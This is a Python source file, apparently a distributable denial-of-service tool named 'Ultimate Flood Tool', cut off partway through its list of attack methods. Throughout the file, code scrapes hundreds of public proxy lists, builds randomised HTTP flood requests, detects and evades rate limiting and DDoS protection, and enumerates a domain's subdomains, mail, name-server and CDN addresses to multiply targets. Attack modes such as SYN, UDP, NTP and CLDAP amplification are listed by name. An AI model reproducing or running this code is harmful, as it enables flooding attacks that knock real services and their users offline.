#!/usr/bin/env python3
"""
Ultimate Flood Tool – ENHANCED INFINITE ATTACK with ADVANCED FEATURES
- Dynamic thread adjustment based on performance
- Geo-targeting for specific countries
- Rate-limit detection & auto-bypass
- Response analysis to refine attacks
- Proxy quality testing before use
- Complete request randomization
- Resource monitoring & auto-optimization
- Full URL support with IP discovery
- 56+ MHDDoS attack methods
- NO METHOD ROTATION - Uses specified method permanently
- FIXED THREAD POOL - No more "can't start new thread" errors
"""

import socket
import threading
import time
import os
import random
import urllib.request
import urllib.error
import sys
import re
import struct
import hashlib
import base64
import zlib
import json
import xml.etree.ElementTree as ET
from urllib.parse import urlparse
import ssl
import http.client
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import ipaddress
import dns.resolver
import dns.reversename
import dns.query
import dns.zone
import requests
from collections import defaultdict
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any
import queue
import signal

try:
    import socks
except ImportError:
    os.system("pip install PySocks")
    import socks

try:
    import dns.resolver
except ImportError:
    os.system("pip install dnspython")
    import dns.resolver

try:
    import psutil
except ImportError:
    os.system("pip install psutil")
    import psutil

# ================== CONFIGURATION ==================
PROXY_FILE = "proxies.txt"
DATA_SIZE = 9000
THREADS = 1000  # REDUCED - Start low, increase if stable
THREADS_MIN = 200
THREADS_MAX = 3000  # REDUCED from 15000
THREADS_AUTO_ADJUST = True
TIMEOUT = 3
CONCURRENT_TARGETS = 5  # REDUCED - Only 5 targets at once
DETECTION_TIMEOUT = 5
ATTACK_DURATION = None
RELOAD_TARGETS_INTERVAL = 60
PROXY_ROTATION_INTERVAL = 3600
MIN_PROXIES_REQUIRED = 50  # REDUCED from 100
MAX_IPS_PER_TARGET = 10  # ADDED - Limit IPs per domain
DISCOVER_SUBDOMAINS = True
DISCOVER_CDN_IPS = True

# ENHANCED FEATURES
METHOD_ROTATION_ENABLED = False
PROXY_TEST_ENABLED = True
PROXY_TEST_TIMEOUT = 2
GEO_TARGETING = False
TARGET_COUNTRIES = ["US", "GB", "DE", "FR", "JP", "BR", "IN", "AU", "RU", "CN"]
RATE_LIMIT_DETECTION = True
RESOURCE_MONITORING = True
RANDOMIZE_REQUESTS = True
RESPONSE_ANALYSIS = True

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/120.0",
]

# ================== PROXY SOURCES ==================
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online/socks5.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/ManuKraft/Proxy-List/main/socks5.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/socks5.txt",
    "https://raw.githubusercontent.com/mmpx222/proxy-list/master/socks5.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online/socks4.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/ManuKraft/Proxy-List/main/socks4.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/socks4.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
    "https://raw.githubusercontent.com/ManuKraft/Proxy-List/main/http.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx222/proxy-list/master/http.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=elite",
    "https://www.proxy-list.download/api/v1/get?type=http&anon=elite",
    "https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous",
    "https://www.proxy-list.download/api/v1/get?type=https",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/https.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online/https.txt",
    "https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list",
    "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/PredatH0r/ProxyList/main/proxy_list.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxy-list/main/proxies.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/proxies.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy-list/main/proxies.txt",
    "https://raw.githubusercontent.com/khanfahim/Free-Proxy-List/main/proxies.txt",
]
for i in range(1, 100):
    PROXY_SOURCES.append(f"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all&proxy={i}")
for i in range(1, 70):
    PROXY_SOURCES.append(f"https://www.proxy-list.download/api/v1/get?type=socks4&id={i}")
for i in range(1, 50):
    PROXY_SOURCES.append(f"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt?{i}")
for i in range(1, 30):
    PROXY_SOURCES.append(f"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous&proxy={i}")

# ================== GLOBAL STATE ==================
PROXY_LIST = []
PROXY_INDEX = 0
proxy_lock = threading.Lock()
stop_event = threading.Event()
total_requests = 0
total_bytes = 0
stats_lock = threading.Lock()
active_attacks = {}
target_lock = threading.Lock()
last_proxy_refresh = 0
attacks_paused = False
discovered_ips_cache = {}

# Thread pool
attack_thread_pool = None
thread_pool_lock = threading.Lock()
active_futures = set()
future_lock = threading.Lock()

# Advanced tracking
response_tracking = defaultdict(lambda: {"count": 0, "status_codes": defaultdict(int), "blocked": 0})
resource_stats = {"cpu": 0, "memory": 0, "network": 0}
rate_limit_detected = defaultdict(bool)
proxy_quality_cache = {}
start_time = time.time()

# ================== THREAD POOL MANAGEMENT ==================
def init_thread_pool():
    """Initialize the thread pool with limited workers"""
    global attack_thread_pool
    with thread_pool_lock:
        if attack_thread_pool is None:
            max_workers = min(THREADS_MAX, 2000)  # Hard cap at 2000
            attack_thread_pool = ThreadPoolExecutor(
                max_workers=max_workers,
                thread_name_prefix="AttackPool"
            )
            print(f"[*] Initialized thread pool with {max_workers} workers")

def shutdown_thread_pool():
    """Shutdown the thread pool"""
    global attack_thread_pool
    with thread_pool_lock:
        if attack_thread_pool:
            attack_thread_pool.shutdown(wait=False, cancel_futures=True)
            attack_thread_pool = None
            print("[*] Thread pool shutdown")

# ================== ADVANCED FEATURE FUNCTIONS ==================

# ---- 1. DYNAMIC THREAD ADJUSTMENT ----
def get_success_rate():
    """Calculate success rate from recent requests"""
    with stats_lock:
        if len(active_attacks) == 0:
            return 50
        rps = total_requests / max(1, time.time() - start_time)
        expected_rps = min(90000, THREADS * 10)
        success_rate = min(100, (rps / expected_rps) * 100)
        return success_rate

def adjust_threads():
    """Dynamically adjust thread count based on performance"""
    global THREADS
    
    if not THREADS_AUTO_ADJUST:
        return
    
    success_rate = get_success_rate()
    
    if success_rate < 10:
        new_threads = max(THREADS_MIN, THREADS - 200)
        if new_threads != THREADS:
            print(f"\n[⚡] Low success rate ({success_rate:.0f}%). Reducing threads to {new_threads}")
            THREADS = new_threads
    elif success_rate > 70 and THREADS < THREADS_MAX:
        new_threads = min(THREADS_MAX, THREADS + 200)
        if new_threads != THREADS:
            print(f"\n[⚡] High success rate ({success_rate:.0f}%). Increasing threads to {new_threads}")
            THREADS = new_threads

# ---- 2. GEO-TARGETING ----
def get_geo_proxies(country):
    """Get proxies from specific country"""
    proxies = []
    try:
        url = f"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&country={country}&timeout=10000"
        req = urllib.request.Request(url, headers={'User-Agent': random.choice(USER_AGENTS)})
        with urllib.request.urlopen(req, timeout=15) as resp:
            content = resp.read().decode('utf-8', errors='ignore')
            for line in content.splitlines():
                line = line.strip()
                if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$', line):
                    ip, port = line.split(':')
                    proxies.append((ip, int(port), socks.SOCKS5))
    except:
        pass
    return proxies

def get_geo_proxy():
    """Get a proxy from target countries"""
    if not GEO_TARGETING:
        return get_random_proxy()
    
    country = random.choice(TARGET_COUNTRIES)
    cache_key = f"geo_{country}"
    if cache_key in proxy_quality_cache:
        proxy = proxy_quality_cache[cache_key]
        if test_proxy(*proxy):
            return proxy
    
    proxies = get_geo_proxies(country)
    for proxy in proxies:
        if test_proxy(*proxy):
            proxy_quality_cache[cache_key] = proxy
            return proxy
    
    return get_random_proxy()

# ---- 3. RATE-LIMIT DETECTION & BYPASS ----
def detect_rate_limit(target_key):
    """Detect if target is rate-limiting"""
    if not RATE_LIMIT_DETECTION:
        return False
    
    tracking = response_tracking.get(target_key, {})
    total = tracking.get("count", 0)
    
    if total < 50:
        return False
    
    blocked = tracking.get("blocked", 0)
    blocked_rate = blocked / total if total > 0 else 0
    
    status_codes = tracking.get("status_codes", {})
    rate_limited = status_codes.get(429, 0) > 5
    
    if blocked_rate > 0.3 or rate_limited:
        if not rate_limit_detected.get(target_key, False):
            print(f"\n[⚠] Rate-limiting detected on {target_key}!")
            rate_limit_detected[target_key] = True
        return True
    
    if rate_limit_detected.get(target_key, False) and blocked_rate < 0.1:
        rate_limit_detected[target_key] = False
        print(f"\n[✓] Rate-limiting no longer detected on {target_key}")
    
    return rate_limit_detected.get(target_key, False)

def bypass_rate_limit(target_key):
    """Apply rate-limit bypass strategies"""
    if not rate_limit_detected.get(target_key, False):
        return
    
    if random.random() < 0.3:
        sleep_time = random.uniform(0.05, 0.2)
        time.sleep(sleep_time)

# ---- 4. RESPONSE ANALYSIS ----
def analyze_response(response, target_key):
    """Analyze response to refine attacks"""
    if not RESPONSE_ANALYSIS or not response:
        return
    
    analysis = {
        "status_code": None,
        "cloudflare": False,
        "ddos_guard": False,
        "blocked": False,
        "rate_limited": False,
        "server": None
    }
    
    try:
        response_str = response.decode('utf-8', errors='ignore')
        
        status_match = re.search(r'HTTP/\d\.\d\s+(\d+)', response_str)
        if status_match:
            analysis["status_code"] = int(status_match.group(1))
        
        if "cf-ray" in response_str.lower() or "cloudflare" in response_str.lower() or "__cf_bm" in response_str:
            analysis["cloudflare"] = True
        if "ddos-guard" in response_str.lower() or "x-ddg" in response_str.lower():
            analysis["ddos_guard"] = True
        
        if analysis["status_code"] in [403, 429, 503]:
            analysis["blocked"] = True
        if "access denied" in response_str.lower() or "blocked" in response_str.lower():
            analysis["blocked"] = True
        
        if analysis["status_code"] == 429:
            analysis["rate_limited"] = True
        
        server_match = re.search(r'Server:\s*([^\r\n]+)', response_str, re.IGNORECASE)
        if server_match:
            analysis["server"] = server_match.group(1).strip()
        
        with stats_lock:
            tracking = response_tracking[target_key]
            tracking["count"] += 1
            if analysis["status_code"]:
                tracking["status_codes"][analysis["status_code"]] += 1
            if analysis["blocked"]:
                tracking["blocked"] += 1
        
    except:
        pass

# ---- 5. PROXY TESTING ----
def test_proxy(proxy_ip, proxy_port, proxy_type):
    """Test if proxy is working"""
    if not PROXY_TEST_ENABLED:
        return True
    
    cache_key = f"{proxy_ip}:{proxy_port}:{proxy_type}"
    if cache_key in proxy_quality_cache:
        return proxy_quality_cache[cache_key]
    
    try:
        if proxy_type in (socks.SOCKS5, socks.SOCKS4):
            s = socks.socksocket()
            s.set_proxy(proxy_type, proxy_ip, proxy_port)
            s.settimeout(PROXY_TEST_TIMEOUT)
            s.connect(("8.8.8.8", 53))
            s.close()
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(PROXY_TEST_TIMEOUT)
            s.connect((proxy_ip, proxy_port))
            s.close()
        
        proxy_quality_cache[cache_key] = True
        return True
    except:
        proxy_quality_cache[cache_key] = False
        return False

def get_tested_proxy():
    """Get a working proxy"""
    attempts = 0
    while attempts < 10 and not stop_event.is_set():
        if GEO_TARGETING and random.random() < 0.3:
            proxy = get_geo_proxy()
        else:
            proxy = get_random_proxy()
        
        if proxy:
            ip, port, proto = proxy
            if test_proxy(ip, port, proto):
                return proxy
        attempts += 1
    
    return get_random_proxy()

# ---- 6. REQUEST RANDOMIZATION ----
def get_randomized_request(target_ip, target_port, method="GET"):
    """Generate completely randomized HTTP request"""
    if not RANDOMIZE_REQUESTS:
        return build_payload(method, target_ip, target_port)
    
    http_versions = ["HTTP/1.0", "HTTP/1.1", "HTTP/2.0"]
    http_version = random.choice(http_versions)
    
    if method in ["GET", "POST", "HEAD"]:
        request_method = method
    else:
        methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "PATCH", "OPTIONS"]
        request_method = random.choice(methods)
    
    depth = random.randint(1, 4)
    path = "/" + "/".join([''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3,10))) for _ in range(depth)])
    
    if random.random() < 0.6:
        query_parts = []
        for _ in range(random.randint(1, 4)):
            key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3,8)))
            val = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5,15)))
            query_parts.append(f"{key}={val}")
        path += "?" + "&".join(query_parts)
    
    ua = random.choice(USER_AGENTS)
    
    headers = [
        f"Host: {target_ip}",
        f"User-Agent: {ua}",
        "Accept: */*",
        "Accept-Encoding: gzip, deflate, br",
        f"Accept-Language: {random.choice(['en-US,en;q=0.9', 'fr-FR,fr;q=0.8', 'de-DE,de;q=0.7', 'zh-CN,zh;q=0.9', 'ja-JP,ja;q=0.8'])}",
        "Cache-Control: no-cache",
        "Pragma: no-cache",
        "Connection: keep-alive"
    ]
    
    num_random = random.randint(15, 40)
    for _ in range(num_random):
        key = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', k=random.randint(5,20)))
        val = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(10,50)))
        headers.append(f"{key}: {val}")
    
    random.shuffle(headers)
    header_str = "\r\n".join(headers)
    
    body = b""
    if request_method in ["POST", "PUT", "PATCH"]:
        body_size = random.randint(100, DATA_SIZE)
        body = os.urandom(body_size)
        headers.append(f"Content-Length: {body_size}")
        headers.append(f"Content-Type: {random.choice(['application/x-www-form-urlencoded', 'multipart/form-data', 'application/json', 'text/plain'])}")
    
    request = f"{request_method} {path} {http_version}\r\n"
    request += "\r\n".join(headers) + "\r\n\r\n"
    
    return request.encode() + body

# ---- 7. RESOURCE MONITORING ----
def check_resources():
    """Monitor system resources"""
    try:
        cpu_percent = psutil.cpu_percent(interval=0.5)
        memory_percent = psutil.virtual_memory().percent
        network = psutil.net_io_counters()
        
        return {
            "cpu": cpu_percent,
            "memory": memory_percent,
            "network_sent": network.bytes_sent,
            "network_recv": network.bytes_recv,
            "overloaded": cpu_percent > 80 or memory_percent > 80
        }
    except:
        return {"cpu": 0, "memory": 0, "overloaded": False}

def optimize_resources():
    """Auto-optimize resource usage"""
    if not RESOURCE_MONITORING:
        return
    
    global THREADS
    
    resources = check_resources()
    
    with stats_lock:
        resource_stats.update(resources)
    
    if resources.get("overloaded", False):
        new_threads = max(THREADS_MIN, THREADS - 200)
        if new_threads != THREADS:
            print(f"\n[💻] System overloaded! CPU: {resources['cpu']:.0f}%, RAM: {resources['memory']:.0f}%. Reducing threads to {new_threads}")
            THREADS = new_threads
        return True
    
    if resources.get("cpu", 0) < 50 and resources.get("memory", 0) < 50 and THREADS < THREADS_MAX:
        new_threads = min(THREADS_MAX, THREADS + 200)
        if new_threads != THREADS:
            print(f"\n[💻] Resources available! CPU: {resources['cpu']:.0f}%, RAM: {resources['memory']:.0f}%. Increasing threads to {new_threads}")
            THREADS = new_threads
        return True
    
    return False

# ================== IP DISCOVERY ENGINE ==================

def discover_ips(domain, port):
    """Discover ALL IPs for a domain including subdomains and CDN edges"""
    ips = set()
    host = domain.lower().strip()
    
    base_domain = host.replace('www.', '')
    
    cache_key = f"{host}:{port}"
    if cache_key in discovered_ips_cache:
        return discovered_ips_cache[cache_key]
    
    print(f"[🔍] Discovering IPs for {host}...")
    
    try:
        for r in dns.resolver.resolve(host, 'A'):
            ips.add(str(r))
    except:
        pass
    
    if not host.startswith('www.'):
        try:
            for r in dns.resolver.resolve(f'www.{host}', 'A'):
                ips.add(str(r))
        except:
            pass
    
    if DISCOVER_SUBDOMAINS:
        subdomains = [
            'api', 'cdn', 'static', 'img', 'video', 'media', 'assets', 'files',
            'download', 'upload', 'stream', 'live', 'dev', 'test', 'staging',
            'admin', 'dashboard', 'app', 'mobile', 'm', 'shop', 'store', 'cart',
            'auth', 'login', 'signin', 'account', 'profile', 'user', 'users',
            'support', 'help', 'docs', 'documentation', 'blog', 'news', 'forum',
            'mail', 'email', 'smtp', 'pop', 'imap', 'ftp', 'sftp', 'ssh',
            'vpn', 'proxy', 'dns', 'ntp', 'time', 'clock', 'sync',
            'backup', 'secure', 'ssl', 'tls', 'crypto', 'wallet', 'pay',
            'payment', 'checkout', 'order', 'track', 'ship', 'delivery',
            'status', 'health', 'monitor', 'metrics', 'stats', 'analytics',
            'log', 'logs', 'trace', 'debug', 'error', 'exception',
            'gateway', 'router', 'switch', 'firewall', 'loadbalancer',
            'cache', 'proxy', 'relay', 'broker', 'queue', 'worker',
            'database', 'db', 'sql', 'mysql', 'postgres', 'mongo', 'redis',
            'elastic', 'search', 'index', 'query', 'graphql', 'rest',
            'soap', 'xmlrpc', 'json', 'protobuf', 'grpc', 'thrift',
            'video', 'audio', 'image', 'photo', 'gallery', 'album',
            'community', 'group', 'team', 'org', 'company', 'corp',
            'partner', 'vendor', 'client', 'customer', 'billing'
        ]
        
        for sub in subdomains:
            try:
                sub_host = f"{sub}.{base_domain}"
                for r in dns.resolver.resolve(sub_host, 'A'):
                    ips.add(str(r))
                    if len(ips) >= MAX_IPS_PER_TARGET:
                        break
                if len(ips) >= MAX_IPS_PER_TARGET:
                    break
            except:
                pass
    
    if DISCOVER_CDN_IPS and len(ips) < 20:
        resolvers = ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222', '8.26.56.26']
        for resolver_ip in resolvers:
            try:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = [resolver_ip]
                for r in resolver.resolve(host, 'A'):
                    ips.add(str(r))
                    if len(ips) >= MAX_IPS_PER_TARGET:
                        break
                if len(ips) >= MAX_IPS_PER_TARGET:
                    break
            except:
                pass
    
    try:
        url = f"https://api.securitytrails.com/v1/domain/{base_domain}/subdomains"
        headers = {'APIKEY': 'free'}
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            data = response.json()
            for sub in data.get('subdomains', [])[:20]:
                try:
                    sub_host = f"{sub}.{base_domain}"
                    for r in dns.resolver.resolve(sub_host, 'A'):
                        ips.add(str(r))
                        if len(ips) >= MAX_IPS_PER_TARGET:
                            break
                    if len(ips) >= MAX_IPS_PER_TARGET:
                        break
                except:
                    pass
    except:
        pass
    
    try:
        for r in dns.resolver.resolve(host, 'MX'):
            mx_host = str(r.exchange).rstrip('.')
            try:
                for a in dns.resolver.resolve(mx_host, 'A'):
                    ips.add(str(a))
            except:
                pass
    except:
        pass
    
    try:
        for r in dns.resolver.resolve(host, 'NS'):
            ns_host = str(r.target).rstrip('.')
            try:
                for a in dns.resolver.resolve(ns_host, 'A'):
                    ips.add(str(a))
            except:
                pass
    except:
        pass
    
    try:
        for r in dns.resolver.resolve(host, 'CNAME'):
            cname_host = str(r.target).rstrip('.')
            try:
                for a in dns.resolver.resolve(cname_host, 'A'):
                    ips.add(str(a))
            except:
                pass
    except:
        pass
    
    if not ips:
        try:
            ips.add(socket.gethostbyname(host))
        except:
            pass
    
    ip_list = list(ips)[:MAX_IPS_PER_TARGET]
    discovered_ips_cache[cache_key] = ip_list
    
    print(f"[✓] Discovered {len(ip_list)} IPs for {host}")
    for ip in ip_list[:10]:
        print(f"    - {ip}")
    if len(ip_list) > 10:
        print(f"    ... and {len(ip_list) - 10} more")
    
    return ip_list

# ================== PROXY MANAGEMENT ==================
def fetch_proxies(url, proto_hint):
    proxies = []
    try:
        req = urllib.request.Request(url, headers={'User-Agent': random.choice(USER_AGENTS)})
        with urllib.request.urlopen(req, timeout=15) as resp:
            content = resp.read().decode('utf-8', errors='ignore')
            for line in content.splitlines():
                line = line.strip()
                if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$', line):
                    ip, port = line.split(':')
                    proxies.append((ip, int(port), proto_hint))
                elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+:\w+$', line):
                    parts = line.split(':')
                    if len(parts) >= 3:
                        ip, port, proto_str = parts[0], int(parts[1]), parts[2]
                        if 'socks5' in proto_str.lower():
                            proxies.append((ip, port, socks.SOCKS5))
                        elif 'socks4' in proto_str.lower():
                            proxies.append((ip, port, socks.SOCKS4))
                        else:
                            proxies.append((ip, port, proto_hint))
    except Exception:
        pass
    return proxies

def scrape_all_proxies(force=False):
    global PROXY_LIST, PROXY_INDEX, last_proxy_refresh, attacks_paused
    
    current_time = time.time()
    if not force and (current_time - last_proxy_refresh) < PROXY_ROTATION_INTERVAL:
        print(f"[*] Proxy refresh not needed yet. Next refresh in {int(PROXY_ROTATION_INTERVAL - (current_time - last_proxy_refresh))} seconds")
        return True
    
    print(f"[*] {'Refreshing' if last_proxy_refresh > 0 else 'Scraping'} proxies from 250+ sources...")
    
    if last_proxy_refresh > 0:
        attacks_paused = True
        print("[*] Attacks paused during proxy refresh...")
        time.sleep(2)
    
    all_proxies = []
    for url in PROXY_SOURCES:
        if "socks5" in url:
            proto = socks.SOCKS5
        elif "socks4" in url:
            proto = socks.SOCKS4
        else:
            proto = socks.SOCKS5
        proxies = fetch_proxies(url, proto)
        all_proxies.extend(proxies)
        time.sleep(0.1)
    
    unique = {}
    for ip, port, proto in all_proxies:
        key = f"{ip}:{port}:{proto}"
        if key not in unique:
            unique[key] = (ip, port, proto)
    
    with proxy_lock:
        PROXY_LIST = list(unique.values())
        PROXY_INDEX = 0
        last_proxy_refresh = time.time()
        
        with open(PROXY_FILE, 'w') as f:
            for ip, port, proto in PROXY_LIST:
                proto_name = "SOCKS5" if proto == socks.SOCKS5 else "SOCKS4" if proto == socks.SOCKS4 else "HTTP"
                f.write(f"{ip}:{port}:{proto_name}\n")
    
    print(f"[+] Scraped {len(PROXY_LIST)} unique proxies")
    
    if len(PROXY_LIST) < MIN_PROXIES_REQUIRED:
        print(f"[!] Only {len(PROXY_LIST)} proxies found. Need {MIN_PROXIES_REQUIRED}")
        attacks_paused = False
        return False
    
    attacks_paused = False
    print("[+] Attacks resumed with fresh proxies!")
    return True

def load_proxies():
    global PROXY_LIST, last_proxy_refresh
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            lines = f.read().splitlines()
        PROXY_LIST = []
        for line in lines:
            parts = line.strip().split(':')
            if len(parts) >= 3:
                ip = parts[0]
                port = int(parts[1])
                proto_str = parts[2]
                if proto_str == "SOCKS5":
                    proto = socks.SOCKS5
                elif proto_str == "SOCKS4":
                    proto = socks.SOCKS4
                else:
                    proto = socks.SOCKS5
                PROXY_LIST.append((ip, port, proto))
        if PROXY_LIST:
            print(f"[+] Loaded {len(PROXY_LIST)} proxies from {PROXY_FILE}")
            last_proxy_refresh = time.time() - PROXY_ROTATION_INTERVAL + 300
            return True
    return False

def get_random_proxy():
    global PROXY_INDEX
    
    if attacks_paused:
        return None
    
    with proxy_lock:
        if not PROXY_LIST:
            return None
        
        PROXY_INDEX = (PROXY_INDEX + 1) % len(PROXY_LIST)
        ip, port, proto = PROXY_LIST[PROXY_INDEX]
        
        if random.random() < 0.3:
            ip, port, proto = random.choice(PROXY_LIST)
        
        return (ip, port, proto)

def refresh_proxies_loop():
    while not stop_event.is_set():
        time.sleep(60)
        current_time = time.time()
        if (current_time - last_proxy_refresh) >= PROXY_ROTATION_INTERVAL:
            print("\n[*] Proxy rotation timer triggered. Getting fresh proxies...")
            scrape_all_proxies(force=True)

# ================== TARGET PARSER ==================
def parse_target(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    parts = line.split(':')
    method = None
    port = None
    host = None
    
    if len(parts) >= 3:
        possible_method = parts[-1].upper()
        valid_methods = {
            "GET", "POST", "OVH", "RHEX", "STOMP", "STRESS", "DYN", "DOWNLOADER", 
            "SLOW", "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", 
            "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB", "KILLER", "TOR",
            "TCP", "UDP", "SYN", "OVH-UDP", "CPS", "ICMP", "CONNECTION", "VSE", 
            "TS3", "FIVEM", "FIVEM-TOKEN", "MEM", "NTP", "MCBOT", "MINECRAFT", 
            "MCPE", "DNS", "CHAR", "CLDAP", "ARD", "RDP",
            "CLOUDFLARE", "DDOSGUARD", "OVH_TCP", "OVH_UDP", "FIVEM_AMP", "FIVEM_RCON",
            "RST", "FIN", "PSH", "ACK", "Redis", "MongoDB", "Elasticsearch", "Cassandra", 
            "CouchDB", "RethinkDB", "InfluxDB", "Neo4j", "ArangoDB", "OrientDB", 
            "FoundationDB", "TiDB", "CockroachDB", "YugabyteDB", "ScyllaDB", "TimeScaleDB", 
            "QuestDB", "ClickHouse", "Druid", "Pinot", "Kylin", "Impala", "Hive", "Spark", 
